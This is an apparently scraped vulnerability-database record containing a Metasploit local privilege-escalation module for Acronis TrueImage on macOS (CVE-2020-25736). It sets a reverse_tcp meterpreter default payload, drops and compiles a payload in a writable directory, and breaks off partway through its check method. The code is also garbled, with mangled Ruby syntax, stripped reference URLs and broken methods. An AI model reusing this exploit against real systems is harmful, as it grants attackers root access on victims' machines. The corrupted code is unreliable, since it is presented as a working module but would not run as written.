{
    "text": "vul_url : ， vul_name : Acronis TrueImage XPC Privilege Escalation ， vul_date : 2022.12.16 ， vul_credit_name : Csaba Fitzl ， vul_risk : Medium ， vul_local : ， vul_remote : ， vul_cve : CVE-2020-25736 ， vul_cwe : CWE-264 ， vul_poc : ， # This module requires Metasploit: ， # Current source: ， class MetasploitModule < Msf:Exploit:Local ， Rank = ExcellentRanking ， include Msf:Post:File ， include Msf:Post:Common ， include Msf:Post:Process ， include Msf:Exploit:EXE ， include Msf:Exploit:FileDropper ， prepend Msf:Exploit:Remote:AutoCheck ， super( ， update_info( ， info, ， 'Name' => 'Acronis TrueImage XPC Privilege Escalation', ， 'Description' => %q{ ， Acronis TrueImage versions 2019 update 1 through 2021 update 1 ， are vulnerable to privilege escalation. The `com.acronis.trueimagehelper` ， helper tool does not perform any validation on connecting clients, ， which gives arbitrary clients the ability to execute functions provided ， by the helper tool with `root` privileges. ， }, ， 'License' => MSF_LICENSE, ， 'Author' => [ ， 'Csaba Fitzl', # @theevilbit - Vulnerability Discovery ， 'Shelby Pace' # Metasploit Module and Objective-c code ， ], ， 'Platform' => [ 'osx' ], ， 'Arch' => [ ARCH_X64 ], ， 'SessionTypes' => [ 'shell', 'meterpreter' ], ， 'Targets' => [ 'Auto', {} ], ， 'Privileged' => true, ， ' ， [ 'CVE', '2020-25736' ], ， [ 'URL', ' ], ， [ 'URL', ' ] ， ], ， 'DefaultOptions' => { ， 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp', ， 'WfsDelay' => 15 ， }, ， 'DisclosureDate' => '2020-11-11', ， 'DefaultTarget' => 0, ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ], ， 'Reliability' => [ REPEATABLE_SESSION ], ， 'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ] ， } ， register_options([ ， OptString.new('WRITABLE_DIR', [ true, 'Writable directory to write the payload to', '/tmp' ]), ， OptString.new('SHELL', [ true, 'Shell to use for executing payload', '/bin/zsh' ]), ， OptEnum.new('COMPILE', [ true, 'Compile exploit on target', 'Auto', [ 'Auto', 'True', 'False' ] ]) ， ]) ， end ， def tmp_dir ， datastore['WRITABLE_DIR'].to_s ， end ， def sys_shell ， datastore['SHELL'].to_s ， end ， def compile ， datastore['COMPILE'] ， end ， def compile_on_target? ， ret = cmd_exec('xcode-select -p') ， end ， true ， end ， def exp_file_name ， @exp_file_name |= Rex:Text.rand_text_alpha(5.10) ， end ， def check ， helper_location = '/Library/PrivilegedHelperTools' ， helper_svc_names = [ 'com.acronis.trueimagehelper', 'com.acronis.helpertool' ] ， plist = '/Applications/Acronis True Image.app/Contents/Info.plist' ， unless helper_svc_names.any? { |svc_name| file?(\"#{helper_location}/#{svc_name}\") }"
}